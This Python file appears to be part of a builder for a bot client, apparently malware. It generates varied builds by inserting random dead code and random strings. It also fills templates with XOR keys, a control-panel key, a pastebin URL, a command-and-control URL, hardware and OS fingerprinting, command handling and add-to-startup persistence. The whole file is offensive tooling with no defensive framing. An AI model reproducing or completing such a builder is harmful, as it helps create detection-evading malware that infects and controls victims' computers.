import random, string
from random import randint
from deadFunctionsObject import *
from configs import *


#random code generator
def random_code_gen():
    #get an ramdom numb of deadCode lines from the array
    randomInt_ = randint(1, 2)
    #return string
    r_string = "";
    i=0;
    while i < randomInt_:
        #Grabe an random line

        randomGrab = deadCodeLine[randint(0, len(deadCodeLine)-1)]
        r_string = r_string + randomGrab['line'] + '\n'
        i = i + 1;

    return r_string;

#smiColHelper
def smiColHelper(leght,cout):
    if cout >= leght:
        return ''
    else:
        return ', '

#Random string generator
def random_string(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))


##replase an random string when read  word "randomiZeMe()"
def randomiZeMeHellper(codeLine):
    cout = 1;
    while cout == 1:
        if 'randomiZeMe()' in codeLine:
            codeLine = codeLine.replace('randomiZeMe()', random_string(randint(15, 25)), 1)
        else:
            cout = 0;

    return codeLine

##append on file helper
def append_on_file_hellper(fileToAppend, dataToAppend):
    with open(fileToAppend, 'a') as fn:
        fn.write(dataToAppend)

##Main functions
def replace_array_vars_function(codeLine):
    cout = 1;
    while cout == 1:
        if '&main_xor_key' in codeLine:
            codeLine = codeLine.replace('&main_xor_key', mainVarArray['key'], 1)

        elif '&liveFunction_reverse_char' in codeLine:
            codeLine = codeLine.replace('&liveFunction_reverse_char', mainLiveFuncArray['reverse_char'], 1)

        elif '&livefunction_xor_flat' in codeLine:
            codeLine = codeLine.replace('&livefunction_xor_flat', mainLiveFuncArray['xor_flat'], 1)

        elif '&livefunction_base64_encode' in codeLine:
            codeLine = codeLine.replace('&livefunction_base64_encode', mainLiveFuncArray['base64_encode'], 1)

        elif '&livefunction_base64_decode' in codeLine:
            codeLine = codeLine.replace('&livefunction_base64_decode', mainLiveFuncArray['base64_decode'], 1)

        elif '&livefunction_xor_reversed' in codeLine:
            codeLine = codeLine.replace('&livefunction_xor_reversed', mainLiveFuncArray['xor_reversed'], 1)

        elif '&livefunction_get_id' in codeLine:
            codeLine = codeLine.replace('&livefunction_get_id', mainLiveFuncArray['get_hd_id'], 1)

        elif '&livefunction_os_version' in codeLine:
            codeLine = codeLine.replace('&livefunction_os_version', mainLiveFuncArray['os_version'], 1)

        elif '&mainArray_bot_version' in codeLine:
            codeLine = codeLine.replace('&mainArray_bot_version', mainVarArray['bot_version'], 1)

        elif '&livefunction_encode_constructor' in codeLine:
            codeLine = codeLine.replace('&livefunction_encode_constructor', mainLiveFuncArray['encode_constructor'], 1)

        elif '&mainArray_panel_key' in codeLine:
            codeLine = codeLine.replace('&mainArray_panel_key', mainVarArray['panel_key'], 1)

        elif '&mainArray_paster_bin' in codeLine:
            codeLine = codeLine.replace('&mainArray_paster_bin', mainVarArray['pastBin_url'], 1)

        elif '&mainArray_main_url_config' in codeLine:
            codeLine = codeLine.replace('&mainArray_main_url_config', mainVarArray['main_url'], 1)

        elif '&livefunction_url_constructor' in codeLine:
            codeLine = codeLine.replace('&livefunction_url_constructor', mainLiveFuncArray['url_Cunstructor'], 1)

        elif '&mainLiveFunction_escape_json' in codeLine:
            codeLine = codeLine.replace('&mainLiveFunction_escape_json', mainLiveFuncArray['escape_json'], 1)

        elif '&liveFunction_startUp_pogram' in codeLine:
            codeLine = codeLine.replace('&liveFunction_startUp_pogram', mainLiveFuncArray['start_up'], 1)

        elif '&mainArray_main_buffer' in codeLine:
            codeLine = codeLine.replace('&mainArray_main_buffer', mainVarArray['main_buffer'], 1)

        elif '&mainArray_main_url_char' in codeLine:
            codeLine = codeLine.replace('&mainArray_main_url_char', mainVarArray['main_url_char'], 1)

        elif '&livefunction_http_request' in codeLine:
            codeLine = codeLine.replace('&livefunction_http_request', mainLiveFuncArray['http_request'], 1)

        elif '&mainArray_main_json_decode_buffer' in codeLine:
            codeLine = codeLine.replace('&mainArray_main_json_decode_buffer', mainVarArray['main_json_decode_buffer'],1)

        elif '&livefunction_action_constructor' in codeLine:
            codeLine = codeLine.replace('&livefunction_action_constructor', mainLiveFuncArray['command_constructor'],1)

        elif '&mainArray_main_url_string' in codeLine:
            codeLine = codeLine.replace('&mainArray_main_url_string', mainVarArray['main_url_string'],1)

        elif '&livefunction_decode_constructor' in codeLine:
            codeLine = codeLine.replace('&livefunction_decode_constructor', mainLiveFuncArray['decode_constructor'], 1)

        elif '&liveFunction_add_to_start_up' in codeLine:
            codeLine = codeLine.replace('&liveFunction_add_to_start_up', mainLiveFuncArray['add_to_start_up'], 1)

        elif '&liveFunction_change_directory_add_to_start_up' in codeLine:
            codeLine = codeLine.replace('&liveFunction_change_directory_add_to_start_up', mainLiveFuncArray['change_directory_add_to_start_up'], 1)







        else:
            cout = 0;

    return codeLine;
